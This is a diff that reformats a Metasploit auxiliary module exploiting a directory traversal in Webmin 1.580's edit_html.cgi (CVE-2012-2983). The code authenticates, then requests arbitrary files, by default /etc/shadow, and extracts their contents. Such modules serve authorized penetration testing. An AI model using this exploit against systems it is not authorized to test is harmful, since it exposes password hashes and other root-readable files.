@@ -8,48 +8,49 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Report
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'Webmin edit_html.cgi file Parameter Traversal Arbitrary File Access',
-      'Description'    => %q{
+    super(
+      update_info(
+        info,
+        'Name' => 'Webmin edit_html.cgi file Parameter Traversal Arbitrary File Access',
+        'Description' => %q{
           This module exploits a directory traversal in Webmin 1.580. The vulnerability
-        exists in the edit_html.cgi component and allows an authenticated user with access
-        to the File Manager Module to access arbitrary files with root privileges. The
-        module has been tested successfully with Webmin 1.580 over Ubuntu 10.04.
-      },
-      'Author'         => [
-        'Unknown', # From American Information Security Group
-        'juan vazquez' # Metasploit module
-      ],
-      'License'        => MSF_LICENSE,
-      'References'     =>
-        [
+          exists in the edit_html.cgi component and allows an authenticated user with access
+          to the File Manager Module to access arbitrary files with root privileges. The
+          module has been tested successfully with Webmin 1.580 over Ubuntu 10.04.
+        },
+        'Author' => [
+          'Unknown', # From American Information Security Group
+          'juan vazquez' # Metasploit module
+        ],
+        'License' => MSF_LICENSE,
+        'References' => [
           ['OSVDB', '85247'],
           ['BID', '55446'],
           ['CVE', '2012-2983'],
           ['URL', 'http://www.americaninfosec.com/research/dossiers/AISG-12-002.pdf'],
           ['URL', 'https://github.com/webmin/webmin/commit/4cd7bad70e23e4e19be8ccf7b9f245445b2b3b80']
         ],
-      'DisclosureDate' => '2012-09-06',
-      'Actions'        =>
-        [
+        'DisclosureDate' => '2012-09-06',
+        'Actions' => [
           ['Download', 'Description' => 'Download arbitrary file']
         ],
-      'DefaultAction'  => 'Download'
-      ))
+        'DefaultAction' => 'Download'
+      )
+    )
 
     register_options(
       [
         Opt::RPORT(10000),
         OptBool.new('SSL', [true, 'Use SSL', true]),
-        OptString.new('USERNAME',  [true, 'Webmin Username']),
-        OptString.new('PASSWORD',  [true, 'Webmin Password']),
+        OptString.new('USERNAME', [true, 'Webmin Username']),
+        OptString.new('PASSWORD', [true, 'Webmin Password']),
         OptInt.new('DEPTH', [true, 'Traversal depth', 4]),
         OptString.new('RPATH', [ true, "The file to download", "/etc/shadow" ])
-      ])
+      ]
+    )
   end
 
   def run
-
     peer = "#{rhost}:#{rport}"
 
     print_status("Attempting to login...")
@@ -58,11 +59,12 @@ class MetasploitModule < Msf::Auxiliary
 
     res = send_request_cgi(
       {
-        'method'  => 'POST',
-        'uri'     => "/session_login.cgi",
-        'cookie'  => "testing=1",
-        'data'    => data
-      }, 25)
+        'method' => 'POST',
+        'uri' => "/session_login.cgi",
+        'cookie' => "testing=1",
+        'data' => data
+      }, 25
+    )
 
     if res and res.code == 302 and res.get_cookies =~ /sid/
       session = res.get_cookies.scan(/sid\=(\w+)\;*/).flatten[0] || ''
@@ -85,10 +87,11 @@ class MetasploitModule < Msf::Auxiliary
 
     res = send_request_cgi(
       {
-        'method'  => 'GET',
-        'uri'     => "/file/edit_html.cgi?#{data}",
-        'cookie'  => "sid=#{session}"
-      }, 25)
+        'method' => 'GET',
+        'uri' => "/file/edit_html.cgi?#{data}",
+        'cookie' => "sid=#{session}"
+      }, 25
+    )
 
     if (res and res.code == 200 and res.body =~ /#{traversal}/ and res.body =~ /name=body>(.*)<\/textarea>/m)
       loot = $1
@@ -99,6 +102,5 @@ class MetasploitModule < Msf::Auxiliary
       print_error("Failed to retrieve the file")
       return
     end
-
   end
 end
